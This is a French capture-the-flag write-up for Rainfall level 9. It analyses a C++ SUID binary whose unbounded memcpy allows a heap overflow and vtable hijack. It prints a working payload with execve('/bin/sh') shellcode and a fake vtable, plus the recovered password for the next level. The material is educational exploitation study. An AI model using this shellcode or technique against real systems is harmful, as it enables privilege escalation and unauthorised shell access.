
---

# Rainfall – Level 9

## Objectif

Analyser un binaire C++ utilisant des objets et des méthodes virtuelles afin d’identifier une vulnérabilité de type **heap overflow**, permettant de détourner un **appel virtuel (vtable hijacking)** et d’exécuter du code arbitraire avec les privilèges du binaire SUID, afin d’obtenir le mot de passe du niveau suivant.

---

## Analyse générale du programme

Le programme attend au moins un argument en ligne de commande.
Il instancie deux objets de classe `N` sur le heap, copie une chaîne fournie par l’utilisateur dans le premier objet, puis appelle une méthode virtuelle sur le second objet.

L’analyse du désassemblage de `main` montre la séquence suivante :

1. Vérification de `argc`
2. Allocation de deux objets `N` via `operator new`
3. Appel du constructeur `N::N(int)`
4. Appel de `obj1->setAnnotation(argv[1])`
5. Appel virtuel sur `obj2`

---

## Structure de la classe `N`

L’analyse du constructeur `_ZN1NC2Ei` permet de reconstruire précisément la structure mémoire d’un objet `N` :

```asm
movl $0x8048848,(%eax)   ; écriture du pointeur de vtable
mov %edx,0x68(%eax)      ; écriture de l'entier passé au constructeur
```

### Layout mémoire d’un objet `N`

```
offset  taille  description
--------------------------------
0x00    4       pointeur de vtable (vptr)
0x04    100     annotation (buffer)
0x68    4       int n
--------------------------------
total : 0x6c (108 octets)
```

Chaque objet est alloué avec `new(0x6c)`.

---

## La vtable de la classe `N`

La vtable est située en section `.rodata` à l’adresse `0x8048848`.

Inspection mémoire :

```gdb
x/8wx 0x8048848
```

Résultat :

```
vtable[0] = 0x0804873a  -> N::operator+(N&)
vtable[1] = 0x0804874e  -> N::operator-(N&)
```

Ces symboles sont confirmés par `info symbol` et par le désassemblage des fonctions correspondantes.

---

## Fonctionnement normal du programme

### Constructeurs

Deux objets sont créés :

```cpp
N *obj1 = new N(5);
N *obj2 = new N(6);
```

Chaque constructeur initialise :

* le pointeur de vtable
* la valeur entière `n`

---

### Méthode `setAnnotation`

Désassemblage :

```asm
call strlen
add $0x4, this
call memcpy
```

Traduction C++ fidèle :

```cpp
void N::setAnnotation(char *s) {
    size_t n = strlen(s);
    memcpy((char*)this + 4, s, n);
}
```

Cette fonction copie une chaîne dans le champ `annotation`, **sans vérifier la taille**.

---

### Méthodes virtuelles

#### `N::operator+(N&)`

```cpp
int N::operator+(N& other) {
    return this->n + other.n;
}
```

#### `N::operator-(N&)`

```cpp
int N::operator-(N& other) {
    return this->n - other.n;
}
```

---

### Appel virtuel dans `main`

La fin de `main` contient l’instruction clé :

```asm
mov (%eax),%eax    ; eax = obj2->vptr
mov (%eax),%edx    ; edx = vtable[0]
call *%edx
```

Ce code effectue un **appel virtuel**, équivalent à :

```cpp
obj2->operator+( *obj1 );
```

---

## La vulnérabilité

La fonction `setAnnotation` utilise `strlen` et `memcpy` sans vérifier que la chaîne copiée tient dans le buffer `annotation` (100 octets).

Il est donc possible de provoquer un **heap overflow** depuis `obj1`, permettant d’écraser la mémoire adjacente.

---

## Condition d’exploitation

Les deux objets `N` sont alloués consécutivement sur le heap.
L’allocateur aligne les chunks, ce qui place généralement `obj2` à une distance de `0x70` octets après `obj1`.

La copie commence à `(obj1 + 4)`.
La distance entre `(obj1 + 4)` et le début de `obj2` est donc :

```
0x70 - 0x04 = 0x6c
```

Il est donc possible d’atteindre le **pointeur de vtable de `obj2`** en écrivant plus de 0x6c octets.

---

## Mécanisme d’exploitation : vtable hijacking

### Principe

Un appel virtuel C++ repose sur une **double indirection** :

1. Lecture du pointeur de vtable depuis l’objet
2. Lecture de la première entrée de la vtable
3. Saut vers l’adresse obtenue

L’exploit consiste à :

* écraser `obj2->vptr`
* le faire pointer vers une **fausse vtable contrôlée**
* dont la première entrée pointe vers un **shellcode**

---

### Construction de la fausse vtable

La zone `annotation` de `obj1` est contrôlée par l’utilisateur.
Elle est utilisée pour stocker :

1. Une fausse vtable
2. Le shellcode
3. Le padding
4. Le nouvel `vptr` de `obj2`

---

### Calcul du padding

La distance à parcourir est `0x6c` octets depuis `(obj1 + 4)`.

Contenu écrit avant le padding :

* 4 octets : entrée de fausse vtable
* 21 octets : shellcode

Padding requis :

```
0x6c - 4 - 21 = 0x53 = 83 octets
```

---

## Payload finale

```bash
./level9 $(python -c 'print(
    "\x10\xa0\x04\x08" +
    "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" +
    "A" * 83 +
    "\x0c\xa0\x04\x08"
)')
```

### Interprétation

* `0x0804a00c` : adresse de la fausse vtable
* `0x0804a010` : adresse du shellcode
* `obj2->vptr` est écrasé pour pointer vers la fausse vtable
* `vtable[0]` pointe vers le shellcode

---

## Déroulement de l’exécution après overflow

1. `obj2->vptr` est lu → pointe vers la fausse vtable
2. `vtable[0]` est lu → adresse du shellcode
3. `call *%edx` → exécution du shellcode
4. Le shellcode appelle `execve("/bin/sh")`
5. Obtention d’un shell avec les privilèges `bonus0`

---

## Vérification des protections

```
No RELRO | No canary found | NX disabled | No PIE
```

* **NX disabled** : exécution du shellcode en heap possible
* **No PIE** : adresses stables
* **Binaire SUID** : élévation de privilèges effective

---

## Résultat

```sh
$ whoami
bonus0

$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Conclusion

Ce niveau illustre une vulnérabilité typique des programmes C++ mal sécurisés : une écriture non bornée dans un champ d’objet combinée à un appel virtuel permet de détourner le flot d’exécution via un **vtable hijacking**.

L’exploitation repose sur :

* une compréhension précise du layout mémoire des objets,
* le mécanisme des vtables C++,
* et la maîtrise des appels indirects générés par le compilateur.

Ce challenge met en évidence l’importance critique de la validation des tailles lors des copies mémoire, en particulier dans un contexte orienté objet.

---